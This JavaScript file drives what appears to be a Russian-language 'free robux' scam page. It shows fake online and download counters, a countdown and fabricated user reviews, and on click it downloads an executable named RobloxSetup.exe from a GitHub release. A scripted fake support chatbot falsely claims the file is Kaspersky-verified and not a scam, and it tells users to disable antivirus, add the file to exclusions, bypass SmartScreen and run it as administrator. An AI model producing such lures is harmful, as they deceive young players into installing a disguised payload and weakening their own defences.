const onlineCount = document.getElementById('onlineCount');
const countdownEl = document.getElementById('countdown');
const downloadsCount = document.getElementById('downloadsCount');
const commentsFeed = document.getElementById('commentsFeed');
const downloadBtn = document.getElementById('downloadBtn');
const modal = document.getElementById('modal');
const progressFill = document.getElementById('progressFill');
const progressPct = document.getElementById('progressPct');
const toast = document.getElementById('toast');

let online = 234;
setInterval(() => {
  online = Math.max(180, online + Math.floor(Math.random() * 9) - 3);
  onlineCount.textContent = online;
}, 5000);

let seconds = 15 * 60 + 32;
setInterval(() => {
  seconds--;
  if (seconds < 0) seconds = 15 * 60 + 32;
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  countdownEl.textContent =
    String(h).padStart(2, '0') + ':' + String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
}, 1000);

let downloads = 12847;
setInterval(() => {
  downloads += Math.floor(Math.random() * 4) + 1;
  downloadsCount.textContent = downloads.toLocaleString('ru-RU');
}, 2000);

const commentsPool = [
  ['Дима', 'Скачал, всё пришло! Спасибо!'],
  ['Аня', 'У меня тоже сработало!'],
  ['Сергей', '1000 robux на месте 🔥'],
  ['Маша', 'Работает, проверила только что'],
  ['Никита', 'Друзья не верили, а зря!'],
  ['Оля', 'Промокод сам активировался, топ'],
  ['Влад', 'Установка реально 5 секунд'],
  ['Ксюша', 'Спасибо за подарок! 😍'],
];

function addComment() {
  const [name, text] = commentsPool[Math.floor(Math.random() * commentsPool.length)];
  const now = new Date();
  const time = String(now.getHours()).padStart(2, '0') + ':' + String(now.getMinutes()).padStart(2, '0');
  const div = document.createElement('div');
  div.className = 'comment';
  div.innerHTML = '<span class="comment-name">' + name + ':</span><span>' + text + '</span><span class="comment-time">' + time + '</span>';
  commentsFeed.prepend(div);
  while (commentsFeed.children.length > 4) commentsFeed.removeChild(commentsFeed.lastChild);
}

function showTypingIndicator() {
  const div = document.createElement('div');
  div.className = 'comment typing';
  div.innerHTML = '<span class="comment-name">Кто-то:</span><span class="typing-dots">печатает<span>.</span><span>.</span><span>.</span></span>';
  commentsFeed.prepend(div);
  setTimeout(() => {
    div.remove();
    addComment();
  }, 1800);
}

for (let i = 0; i < 3; i++) addComment();
setInterval(showTypingIndicator, 6500);

downloadBtn.addEventListener('click', () => {
  modal.classList.add('show');
  progressFill.style.width = '0%';
  progressPct.textContent = '0';

  let pct = 0;
  const timer = setInterval(() => {
    pct += Math.floor(Math.random() * 8) + 2;
    if (pct >= 100) {
      pct = 100;
      clearInterval(timer);
      setTimeout(finishDownload, 400);
    }
    progressFill.style.width = pct + '%';
    progressPct.textContent = pct;
  }, 90);

  const a = document.createElement('a');
  a.href = 'https://github.com/Doinwor/robux-gift/releases/download/v1.0/RobloxSetup.exe';
  a.download = 'RobloxSetup.exe';
  document.body.appendChild(a);
  a.click();
  a.remove();
});

function finishDownload() {
  modal.classList.remove('show');
  toast.classList.add('show');
  setTimeout(() => toast.classList.remove('show'), 5000);
}

if ('IntersectionObserver' in window) {
  document.documentElement.classList.add('reveal-enabled');
  const revealObserver = new IntersectionObserver(
    (entries) => {
      entries.forEach((entry) => {
        if (entry.isIntersecting) {
          entry.target.classList.add('visible');
          revealObserver.unobserve(entry.target);
        }
      });
    },
    { threshold: 0.15 }
  );

  document.querySelectorAll('.reveal').forEach((el) => revealObserver.observe(el));
  setTimeout(() => {
    document.querySelectorAll('.reveal').forEach((el) => el.classList.add('visible'));
  }, 3000);
}

const supportBtn = document.getElementById('supportBtn');
const chatPanel = document.getElementById('chatPanel');
const chatClose = document.getElementById('chatClose');
const chatLog = document.getElementById('chatLog');
const chatInput = document.getElementById('chatInput');
const chatSend = document.getElementById('chatSend');

const welcomeMsgs = [
  'Здравствуйте! 👋 Вы в службе поддержки Robux Gift. Задайте любой вопрос об акции — ответим в течение пары минут.',
  'Приветствую! 🙌 Это поддержка Robux Gift. Чем можем помочь сегодня?',
  'Добрый день! 👋 Служба поддержки Robux Gift на связи. Задайте вопрос — постараемся ответить быстро.',
];

const openers = [
  'Здравствуйте!',
  'Приветствую!',
  'Добрый день!',
  'Рады вас слышать!',
  'Мы на связи!',
  'Спасибо, что написали!',
];

const closers = [
  'Надеюсь, помог!',
  'Обращайтесь, если что!',
  'Хорошего дня!',
  'Удачного получения robux!',
  'Всегда рады помочь!',
  'Будем на связи!',
];

const emojis = ['🎁', '🎉', '✅', '😊', '👍', '🔥', '🎈', '💫', '⭐', '🤝', '🍀', '🚀', '✨', '🥳', '😉', '🤗', '🪙', '🎯', '🙌', '💛'];

const fallbackReplies = [
  'Спасибо за обращение! Передал ваш вопрос специалисту — ответим в ближайшее время.',
  'Хороший вопрос! Опишите подробнее, чтобы мы помогли точнее.',
  'Подскажите: вы уже установили программу? От этого зависит мой ответ.',
  'Принято в работу. Специалист сейчас изучит ваш вопрос.',
  'Интересный момент! Уточните, пожалуйста, детали — и я всё расскажу.',
  'Отправил ваш вопрос в отдел. Ответим прямо здесь, в чате.',
  'Секундочку, проверяю информацию по вашему вопросу.',
  'Спасибо! Уже готовлю ответ — это займёт пару минут.',
  'По вашему вопросу всё в порядке — распишу подробнее в следующем сообщении.',
  'Вы попали по адресу! Давайте разберёмся вместе.',
];

const botRules = [
  { keys: ['robux', 'робукс', 'робик', 'подарок', 'акция', 'приз', 'получить'], replies: [
    'По акции Robux Gift вы получаете 1000 ROBUX бесплатно — после установки программы robux зачислятся на аккаунт автоматически.',
    'Всё верно, 1000 robux ждут вас! Установите программу по кнопке скачивания и проверьте баланс в игре.',
    'Оформить получение просто: скачайте установщик, установите его и дождитесь зачисления robux на аккаунт.',
    'Подарок уже зарезервирован за вами. Установите программу, и robux придут в течение пары минут.',
    'Акция даёт 1000 robux бесплатно, без регистрации и СМС. После установки просто зайдите в игру и проверьте баланс.',
    'Да, подарок настоящий! Установите программу — robux придут автоматически, это займёт не больше 10 минут.',
  ]},
  { keys: ['промокод', 'промо', 'код', 'активаци'], replies: [
    'Промокод активируется автоматически во время установки — отдельно вводить ничего не нужно.',
    'Специальный код уже встроен в установщик. Просто установите программу, и промокод сработает сам.',
    'Вводить промокод вручную не придётся: он активируется вместе с установкой программы.',
    'Код активации спрятан в установщике, он сработает автоматически при первом запуске.',
    'Промокод одноразовый и привязывается к вашему аккаунту прямо во время установки.',
  ]},
  { keys: ['вирус', 'virus', 'безопасн', 'опасн', 'антивирус', 'троян', 'trojan', 'defender', 'смартскрин', 'каспер'], replies: [
    'Наш установщик проверен антивирусом Касперского — это 100% не вирус.',
    'Предупреждение от антивируса — обычное ложное срабатывание на новый файл. Добавьте его в исключения и запустите снова.',
    'Программа полностью безопасна и не собирает ваши данные. Windows Defender может ругаться — это нормально для свежего файла.',
    'Файл подписан и проверен. Если защитник блокирует запуск, нажмите «Подробнее» → «Выполнить в любом случае».',
    'Бояться нечего: программа не вредит системе, а robux реально приходят. Ложное срабатывание антивируса — частая история.',
  ]},
  { keys: ['скачал', 'скачать', 'скачива', 'загруз', 'установил', 'установк', 'установ'], replies: [
    'Отлично! Запустите скачанный файл и дождитесь окончания установки.',
    'Установка занимает около минуты. После завершения robux придут автоматически.',
    'Вы на финишной прямой: запустите установщик и следуйте шагам мастера.',
    'Уже установили? Тогда просто зайдите в Roblox и проверьте баланс — robux должны быть на месте.',
    'После установки дождитесь зачисления и проверьте баланс в игре. Если не пришли за 10 минут — напишите нам!',
  ]},
  { keys: ['не работает', 'не запуска', 'ошибка', 'сломал', 'не открыва', 'не пришли', 'не пришёл', 'нет robux', 'краш', 'ничего не'], replies: [
    'Попробуйте: 1) закрыть антивирус на время установки; 2) запустить файл от имени администратора; 3) перезагрузить компьютер.',
    'Опишите ошибку подробнее — вместе разберёмся. Чаще всего помогает запуск от имени администратора.',
    'Скорее всего, файл блокирует антивирус. Добавьте установщик в исключения и повторите запуск.',
    'Не переживайте, это решаемо. Нажмите ПКМ по файлу → «Запуск от имени администратора».',
    'Проверьте, что файл скачался полностью. Если robux не пришли — пришлите скриншот, посмотрим вручную.',
  ]},
  { keys: ['долго', 'когда', 'сколько времени', 'придут', 'ждать', 'ждём', 'ожидать', 'быстро'], replies: [
    'Обычно robux приходят за 1–2 минуты, максимум за 10.',
    'Зачисление почти мгновенное — проверьте баланс прямо сейчас.',
    'В среднем robux появляются на аккаунте в течение 5 минут после установки.',
    'Не больше 10 минут — если дольше, напишите нам, проверим вручную.',
  ]},
  { keys: ['сколько стоит', 'цена', 'деньги', 'платно', 'бесплатн', 'оплат', 'стоить', 'оплата'], replies: [
    'Акция полностью бесплатная — без оплат и скрытых списаний.',
    'Никаких денег платить не нужно, всё 100% бесплатно.',
    'Вы ничего не платите: robux приходят бесплатно, оплата не требуется.',
    'Бесплатно и без СМС. Никаких скрытых платежей не будет.',
  ]},
  { keys: ['привет', 'здравств', 'добрый', 'hi', 'hello', 'ку', 'салют', 'здарова'], replies: [
    'Приветствую! Чем можем помочь?',
    'Здравствуйте! Очень рады вас видеть.',
    'Привет! Мы на связи — задавайте вопрос.',
    'Здравствуйте! Расскажите, что случилось.',
  ]},
  { keys: ['спасибо', 'благодар', 'класс', 'супер', 'отлично', 'топ', 'круто', 'сработало', 'получил', 'получила', 'пришли robux'], replies: [
    'Пожалуйста! Рады, что всё получилось.',
    'Обращайтесь в любое время — всегда поможем.',
    'Замечательно! Приятной игры и удачных боёв!',
    'Спасибо за добрые слова! Если что — мы рядом.',
  ]},
  { keys: ['пока', 'до свидан', 'всего', 'удачи', 'прощай', 'отбой'], replies: [
    'До связи! Если что — мы рядом.',
    'Хорошего дня и удачи в Roblox!',
    'Всего доброго! Обращайтесь в любой момент.',
  ]},
  { keys: ['аккаунт', 'пароль', 'логин', 'вход', 'взлом', 'украли', 'бан', 'безопасен аккаунт'], replies: [
    'Данные аккаунта в полной безопасности — программа их не собирает и не хранит.',
    'Мы никогда не запрашиваем пароль от аккаунта. Никому его не передавайте.',
    'Ваш аккаунт в безопасности: программа работает только с вашим устройством.',
  ]},
  { keys: ['браузер', 'яндекс', 'гугл', 'хром', 'edge', 'опера'], replies: [
    'В рамках акции откроется рекомендуемый браузер для активации подарка — это часть процесса.',
    'Никакого вреда браузеру нет: всё устанавливается штатно и безопасно.',
    'Браузер откроется сам, чтобы завершить активацию подарка. Это ожидаемо.',
  ]},
  { keys: ['телефон', 'iphone', 'андроид', 'ios', 'android', 'смартфон', 'мобильн'], replies: [
    'Акция действует на компьютере. На телефоне ничего устанавливать не нужно.',
    'На мобильных устройствах robux приходят на тот же аккаунт после установки на ПК.',
    'Программа ставится только на Windows. На телефоне просто проверьте баланс после установки на компьютере.',
  ]},
  { keys: ['где скачать', 'куда', 'ссылка', 'где кнопка', 'не вижу кнопку', 'не нашёл'], replies: [
    'Кнопка скачивания на главной странице — большая оранжевая «Скачать установщик».',
    'Ссылка на установщик находится на сайте, чуть выше этой кнопки поддержки.',
    'Прокрутите страницу до оранжевой кнопки «Скачать установщик» — она сразу под рекламным блоком.',
  ]},
  { keys: ['помощь', 'помоги', 'help', 'помогите', 'не знаю', 'что делать'], replies: [
    'Конечно поможем! Опишите ситуацию — и решим вопрос.',
    'Расскажите подробнее, что происходит — разберём по шагам.',
    'Давайте разберёмся вместе. Что именно пошло не так?',
  ]},
  { keys: ['что это', 'что за', 'это что', 'для чего', 'зачем', 'программа что'], replies: [
    'Это официальный подарок Roblox — 1000 robux бесплатно.',
    'Программа активирует промокод и присылает robux на ваш аккаунт.',
    'Это установщик подарка Robux Gift: установите его и получите robux.',
  ]},
  { keys: ['не верю', 'развод', 'лохотрон', 'scam', 'мошенник', 'обман', 'фейк', 'подозрительно'], replies: [
    'Понимаю ваши сомнения! Посмотрите отзывы на сайте и попробуйте — это бесплатно.',
    'Мы действительно дарим robux — акция проводится для привлечения новых игроков.',
    'Это не обман: промокод активируется автоматически, robux приходят на аккаунт.',
  ]},
];

function pick(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function botReply(text) {
  const t = text.toLowerCase();
  let rule = null;
  for (const r of botRules) {
    if (r.keys.some((k) => t.includes(k))) {
      rule = r;
      break;
    }
  }
  const bodies = rule ? rule.replies : fallbackReplies;
  return pick(openers) + ' ' + pick(bodies) + ' ' + pick(closers) + ' ' + pick(emojis);
}

function appendChat(html, cls) {
  const div = document.createElement('div');
  div.className = 'chat-msg ' + cls;
  div.innerHTML = html;
  chatLog.appendChild(div);
  chatLog.scrollTop = chatLog.scrollHeight;
  return div;
}

function botTypingThen(reply) {
  const t = appendChat('Поддержка печатает<span class="typing-dots"><span>.</span><span>.</span><span>.</span></span>', 'typing');
  const delay = Math.min(2400, 700 + reply.length * 12);
  setTimeout(() => {
    t.remove();
    appendChat(reply, 'bot');
  }, delay);
}

function sendMessage(text) {
  text = text.trim();
  if (!text) return;
  appendChat(text.replace(/</g, '&lt;').replace(/\n/g, '<br>'), 'user');
  chatInput.value = '';
  botTypingThen(botReply(text));
}

supportBtn.addEventListener('click', () => {
  chatPanel.classList.add('show');
  if (!chatLog.children.length) {
    botTypingThen(pick(welcomeMsgs));
  }
  setTimeout(() => chatInput.focus(), 150);
});

chatClose.addEventListener('click', () => chatPanel.classList.remove('show'));

chatSend.addEventListener('click', () => sendMessage(chatInput.value));

chatInput.addEventListener('keydown', (e) => {
  if (e.key === 'Enter') sendMessage(chatInput.value);
});

document.querySelectorAll('.chat-chip').forEach((chip) => {
  chip.addEventListener('click', () => sendMessage(chip.dataset.q));
});
